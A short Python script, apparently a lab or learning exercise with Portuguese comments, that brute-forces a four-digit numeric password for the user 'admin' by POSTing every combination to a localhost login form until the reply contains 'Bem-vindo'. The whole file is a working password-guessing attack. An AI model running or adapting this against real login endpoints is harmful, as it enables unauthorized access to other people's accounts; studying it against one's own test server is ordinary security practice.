import requests
import itertools
import string

url = "http://localhost:8000"
usuario = "admin"

caracteres = string.digits
tamanho = 4

tentativas = 0
encontrou = False          # "bandeira" que marca se achamos a senha

for combo in itertools.product(caracteres, repeat=tamanho):
    senha = ''.join(combo)
    tentativas += 1
    response = requests.post(url, data={"usuario": usuario, "senha": senha})

    if "Bem-vindo" in response.text:
        print(f"[+] SUCESSO! Senha: {senha} (em {tentativas} tentativas)")
        encontrou = True
        break
    else:
        print(f"[-] Falha: {senha}")

if not encontrou:
    print("Senha nao encontrada. Testei todas as combinacoes.")